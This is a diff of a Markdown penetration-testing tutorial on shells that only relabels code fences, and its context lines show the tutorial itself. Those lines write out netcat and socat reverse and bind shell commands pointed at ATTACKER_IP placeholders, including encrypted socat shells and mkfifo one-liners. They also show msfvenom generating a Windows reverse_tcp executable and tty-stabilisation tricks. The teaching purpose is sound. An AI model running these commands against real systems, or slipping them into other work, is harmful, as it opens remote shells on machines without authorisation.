@@ -91,11 +91,11 @@ Generally, reverse shells are easier to learn and debug.
 ### Reverse Shell Example
 
 The reverse shell is more common. On the attacking machine, we might run a command such as:
-```console
+```sh
 ~$ sudo nc -lvnp 443
 ```
 Meanwhile, on the target, we might execute a command such as: 
-```console
+```sh
 ~$ nc <LOCAL_IP> <PORT> -e /bin/bash
 ```
 albeit not explicitly; usually executed via some code injection, etc.
@@ -119,7 +119,7 @@ The bind shell is less common, but still very useful. On the target, we will nee
 > nc -lvnp <PORT> -e "cmd.exe"
 ```
 On the attacking machine, we will execute something like
-```console
+```sh
 ~$ nc <MACHINE_IP> <PORT>
 ```
 
@@ -145,7 +145,7 @@ Shells can either be *interactive* or *non-interactive*.
 As mentioned previously, Netcat is the basic tool in a pentester's toolkit when it comes to networking. For **reverse shells**, Netcat can be used to start a listener on the attacking machine.
 
 The syntax for starting a listener in Linux is
-```console
+```sh
 ~$ nc -lvnp <PORT>
 ```
 * `-l` tells Netcat that this is a listener
@@ -158,7 +158,7 @@ In the previous section, the example used port 443. Realistically, we can use an
 > It is often a good idea to use a well-known port number (e.g. 80, 443, 53) as they are more likely to get past outbound firewall rules on the target.
 
 On the other hand, for **bind shells**, we already have a listener on the target on a specified port -- all we need to do is connect to it. The syntax is straight forward:
-```console
+```sh
 ~$ nc <TARGET_IP> <PORT>
 ```
 
@@ -178,7 +178,7 @@ This technique is only applicatble to Linux systems, since they always have *Pyt
 
 1. In the reverse shell, we execute
 
-   ```console
+   ```sh
    ~$ python -c 'import pty; pty.spawn("/bin/bash")'
    ```
    This is essentially running a Python script to spawn a better featured bash shell.
@@ -188,14 +188,14 @@ This technique is only applicatble to Linux systems, since they always have *Pyt
    At this point, the shell will look better, but we still lack functionality like autocomplete, and `Ctrl + C` still kills the shell. 
 
 2. In the shell that we spawned, we execute
-   ```console
+   ```sh
    ~$ export TERM=xterm
    ```
 
     This sets the environment variable `TERM` to be `xterm` which gives us access to terminal commands such as `clear`.
 
 3. Finally, we will background the shell using `Ctrl + Z`, then run 
-   ```console
+   ```sh
    ~$ stty raw -echo; fg
    ```
 
@@ -215,7 +215,7 @@ Note that if the reverse shell is killed, any input in our own terminal will not
 > rlwrap is **not** installed by default on Kali Linux, so we have to first install it with `sudo apt install rlwrap`.
 
 To use rlwrap, we need to invoke a slightly different listener:
-```console
+```sh
 ~$ rlwrap nc -lvnp <PORT>
 ```
 
@@ -242,7 +242,7 @@ Sending and receiving shells with Socat is covered in a later section.
 -----
 
 With the above techniques, it is useful to be able to change the terminal tty size. Typically, the shell does this automatically, but must be done manually for reverse/bind shells. In our own terminal, we execute
-```console
+```sh
 ~$ stty -a
 speed 38400 baud; rows 45; columns 118; line = 0;
 ...
@@ -251,7 +251,7 @@ and note down the values for `rows` and `columns`.
 
 Then, in the reverse/bind shell, we execute
 
-```console
+```sh
 ~$ stty rows <ROWS>
 ~$ stty cols <COLUMNS>
 ```
@@ -267,26 +267,26 @@ This changes the registered height and width of the terminal so that programs --
 * between two listening ports. 
 
 For **reverse shells**, the basic syntax for a listener is
-```console
+```sh
 ~$ socat TCP-L:<PORT> -
 ```
 
 This takes two points -- a listening port and standard input -- and connect them together. The resulting shell is unstable, much like using Netcat. 
 
 On Windows, we can connect to the listener using 
-```console
+```sh
 ~$ socat TCP:<LOCAL_IP>:<LOCAL_PORT> EXEC:powershell.exe,pipes
 ```
 
 The `pipes` option forces Powershell (or `cmd.exe`) to use UNIX style standard input and output. 
 
 For a Linux target, we execute
-```console
+```sh
 ~$ socat TCP:<LOCAL_IP>:<LOCAL_PORT> EXEC:"bash -li"
 ```
 
 For **bind shells**, we would start a listener on a Linux target by using: 
-```console
+```sh
 ~$ socat TCP-L:<PORT> EXEC:"bash -li"
 ```
 
@@ -298,7 +298,7 @@ Similarly, on a Windows target:
 Again, the `pipes` option is used to interface between the standard input and outputs of Windows and UNIX.
 
 The attacking machine should then execute
-```console
+```sh
 ~$ socat TCP:<TARGET_IP>:<TARGET_PORT> -
 ```
 to connect to the listener. 
@@ -308,7 +308,7 @@ to connect to the listener.
 ### Stablised shells
 
 As mentioned earlier, one of the more porwerful uses for Socat is that it is able to obtain a *fully stable* Linux tty reverse shell. The listener syntax in this case is
-```console
+```sh
 ~$ socat TCP-L:<PORT> FILE:`tty`,raw,echo=0
 ```
 
@@ -317,7 +317,7 @@ In this case, Socat is establishing a connection between a listening port and a 
 > This is approximately equivalent to using `Ctrl + Z`, followed by `stty raw -echo; fg` with a Netcat shell.
 
 This listener must then be activated with a specific Socat command on the target. Thus, the target must have Socat installed on it. The special command is 
-```console
+```sh
 ~$ socat TCP:<ATTACKER_IP>:<ATTACKER_PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 
@@ -344,20 +344,20 @@ Socat is also capable of creating *encrypted* shells -- both bind and reverse. E
 
 We first need to generate a certificate in order to use encrypted shells. It is easy to do this on the attacking machine
 
-```console
+```sh
 ~$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
 ```
 
 This command creates a 2048-bit RSA key with a matching certificate file, self-signed and valid for just under a year. When this command is executed, it will ask for information about the certificate. This can be left blank or filled randomly. 
 
 We then merge the two created files together
-```console
+```sh
 ~$ cat shell.key shell.crt > shell.pem
 ```
 
 Then, to set up a reverse shell listener, we use
 
-```console
+```sh
 ~$ socat OPENSSL-LISTEN:<PORT>, cert=shell.pem, verify=0 -
 ```
 
@@ -367,7 +367,7 @@ Then, to set up a reverse shell listener, we use
 
 To connect to the listener, we execute the following on the target:
 
-```console
+```sh
 ~$ socat OPENSSL:<LOCAL_IP>:<LOCAL_PORT>, verify=0 EXEC:/bin/bash
 ```
 
@@ -379,13 +379,13 @@ In the image, the attacker is on the left, while the target is on the right.
 
 Similarly for a bind shell, the target starts a listener using
 
-```console
+```sh
 ~$ socat OPENSSL_LISTEN:<PORT>, cert.shell.pem, verify=0 EXEC:cmd.exe,pipes
 ```
 
 and the attacking machine connects to the listener using
 
-```console
+```sh
 ~$ socat OPENSSL:<TARGET_IP>:<TARGET_PORT>, verify=0 -
 ```
 
@@ -393,33 +393,33 @@ Since the certificate has to be used with the listener, we have to copy the `.pe
 
 This technique also works together with the special Linux tty shell discussed [previously](#stablised-shells). The listener syntax is 
 
-```console
+```sh
 ~$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE=`tty`,raw,echo=0
 ```
 
 and the syntax to connect to the listener is 
 
-```console
+```sh
 ~$ socat OPENSSL:<ATTACKER_IP>:<ATTACKER_PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 
 ## Common shell payloads
 
 In some versions of Netcat, there is a `-e` option, which allows us to execute a process upon connection. For example, if we start a listener with:
-```console
+```sh
 ~$ nc -lvnp <PORT> -e /bin/bash
 ```
 
 Then, connecting to the above listener with Netcat results in a bind shell on the target.
 
 Similarly, if we connect to a listener using
-```console
+```sh
 ~$ nc <ATTACKER_IP> <PORT> -e /bin/bash
 ```
 would result in a reverse shell on the target.
 
 This almost always works on Windows where a static binary is required. On Linux, we may create a listener for a bind shell using
-```console
+```sh
 ~$ mkfifo /tmp/f; nc -lnvp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
 
@@ -427,7 +427,7 @@ This almost always works on Windows where a static binary is required. On Linux,
 
 We can similarly send a Netcat reverse shell:
 
-```console
+```sh
 ~$ mkfifo /tmp/f; nc <ATTACKER_IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
 
@@ -455,13 +455,13 @@ msfvenom is part of the Metasploit framework and can be used to generate code fo
 
 The standard syntax for msfvenom to generate payloads is as follows:
 
-```console
+```sh
 ~$ msfvenom -p <PAYLOAD> <OPTIONS>
 ```
 
 For example, to generate a Windows x64 reverse shell in an executable format, we would use
 
-```console
+```sh
 ~$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.10 LPORT=50000
 ```
 
@@ -516,13 +516,13 @@ windows/x64/meterpreter/reverse_tcp
 
 We can list all available payloads in msfvenom using the command:
 
-```console
+```sh
 ~$ msfvenom --list payloads
 ```
 
 We can then pipe the output of this command into `grep` to search for specific payloads. For example, the command
 
-```console
+```sh
 ~$ msfvenom --list payloads | grep "linux/x86"
 ```
 
